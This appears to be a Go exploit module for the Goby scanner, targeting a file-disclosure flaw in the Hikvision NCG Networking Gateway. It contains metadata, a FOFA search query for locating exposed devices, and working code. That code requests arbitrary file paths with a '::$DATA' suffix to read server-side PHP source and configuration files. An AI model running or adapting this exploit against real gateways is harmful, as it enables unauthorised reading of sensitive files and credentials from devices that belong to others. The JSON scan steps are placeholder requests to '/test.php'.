package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Hikvision NCG Networking Gateway login.php Directory traversal Vulnerability",
    "Description": "<p>The Hikvision NCG Networking Gateway  of Hikvision is a carrier level network gateway device integrating signaling gateway service, media gateway service, security authentication, authority management, log management and network management functions.</p><p>An attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc. through this vulnerability, causing the website to be in an extremely insecure state.</p>",
    "Product": "HIKVISION-NCG-Networking-Gateway",
    "Homepage": "https://www.hikvision.com/cn/",
    "DisclosureDate": "2022-12-17",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"data/login.php\"",
    "GobyQuery": "body=\"data/login.php\"",
    "Level": "3",
    "Impact": "<p>An attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc. through this vulnerability, causing the website to be in an extremely insecure state.</p>",
    "Recommendation": "<p>At present, no detailed solution is provided. Please follow the update of the manufacturer's homepage: <a href=\"https://www.hikvision.com/cn/\">https://www.hikvision.com/cn/</a></p>",
    "References": [
        "https://forum.butian.net/share/305"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "/data/login.php",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "VulType": [
        "Directory Traversal"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "海康威视 NCG 联网网关 login.php 文件目录遍历漏洞",
            "Product": "海康威视 NCG 联网网关",
            "Description": "<p>海康威视 NCG 联网网关是一款集信令网关服务、媒体网关服务、安全认证、权限管理、日志管理以及网管功能于一体的电信级联网网关设备。</p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.hikvision.com/cn/\" target=\"_blank\">https://www.hikvision.com/cn/</a></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Hikvision NCG Networking Gateway login.php Directory traversal Vulnerability",
            "Product": "HIKVISION-NCG-Networking-Gateway",
            "Description": "<p>The Hikvision NCG Networking Gateway&nbsp; of Hikvision is a carrier level network gateway device integrating signaling gateway service, media gateway service, security authentication, authority management, log management and network management functions.</p><p>An attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc. through this vulnerability, causing the website to be in an extremely insecure state.</p>",
            "Recommendation": "<p>At present, no detailed solution is provided. Please follow the update of the manufacturer's homepage: <a href=\"https://www.hikvision.com/cn/\" target=\"_blank\">https://www.hikvision.com/cn/</a><br></p>",
            "Impact": "<p>An attacker can read important system files (such as database configuration files, system configuration files), database configuration files, etc. through this vulnerability, causing the website to be in an extremely insecure state.<br><br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10781"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			uri_1 := "/data/login.php::$DATA"
			cfg_1 := httpclient.NewGetRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			if resp_1, err := httpclient.DoHttpRequest(hostinfo, cfg_1); err == nil {
				if resp_1.StatusCode == 200 && strings.Contains(resp_1.Utf8Html, "getElementsByTagName('user');") && strings.Contains(resp_1.Utf8Html, "<?php") {
					return true
				} else if resp_1.StatusCode == 200 && strings.Contains(resp_1.Utf8Html, "<?php") && strings.Contains(resp_1.Utf8Html, "new domxpath($dom); ") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := ss.Params["filepath"].(string)
			uri := filename + "::$DATA"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.Utf8Html
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
